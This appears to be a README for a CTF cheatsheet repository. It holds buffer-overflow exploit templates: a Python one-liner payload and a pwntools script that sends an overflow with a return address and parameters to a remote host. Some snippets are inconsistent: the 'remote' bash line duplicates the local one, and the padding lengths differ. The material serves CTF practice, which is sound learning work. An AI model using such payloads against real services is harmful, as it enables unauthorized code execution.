# ctf-cheatsheet
This repo comprises useful code bytes for solving common ctf tasks.

### buffer overflow

##### execute locally, string as text input
###### bash
```bash
run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
```

##### execute remotely, string as text input
###### bash
```bash
run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
```
###### pwntools
```bash
from socket import socket
from pwn import *
ip = "sub.domain.com"
port = 1234
ret = 0x080491e2
no = 0x32432342
para_1 = 0xdedebebe
para_2 = 0xc0c00d0d
payload_len = 200 + 20
payload = "A" * payload_len
payload += p32(ret)
payload += p32(no)
payload += p32(para_1)
payload += p32(para_2)
r = remote(ip, port)
r.recvline()
r.sendline(payload)
r.interactive()
```
